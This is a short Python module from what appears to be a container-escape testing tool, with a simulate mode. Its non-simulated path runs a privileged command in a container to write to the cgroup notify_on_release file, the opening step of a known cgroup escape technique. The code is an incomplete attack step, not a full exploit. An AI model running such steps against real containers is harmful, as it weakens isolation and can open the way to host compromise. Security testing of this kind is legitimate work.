# attacks/writable_cgroup_escape.py

def run(container, simulate=False):
    print("[*] Running Writable Cgroup Escape...")

    if simulate:
        print(f"[SIMULATE] Would write '1' to /sys/fs/cgroup/notify_on_release in container '{container.name}'")
        return "Simulated run: No system modification performed."

    try:
        # ⚠️ REAL PAYLOAD EXECUTION
        command = "echo 1 > /sys/fs/cgroup/notify_on_release"
        container.exec_run(command, privileged=True)

        print("[+] Wrote '1' to /sys/fs/cgroup/notify_on_release")
        return "Executed: cgroup modified"

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return f"Failed: {str(e)}"
